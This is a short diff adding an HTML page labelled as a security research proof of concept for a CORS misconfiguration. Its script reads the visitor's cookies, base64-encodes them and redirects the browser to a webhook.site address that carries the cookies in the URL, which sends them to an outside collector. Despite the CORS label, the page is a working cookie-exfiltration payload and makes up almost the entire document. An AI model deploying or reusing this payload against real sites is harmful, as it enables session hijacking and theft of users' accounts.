@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <h1>Security Research PoC - CORS Misconfiguration</h1>
+    <script>
+        var exfil_url = "https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0";
+        var cookies = btoa(unescape(encodeURIComponent(document.cookie)));
+        window.location.href = exfil_url + "?id=" + cookies;
+    </script>
+</body>
+</html>
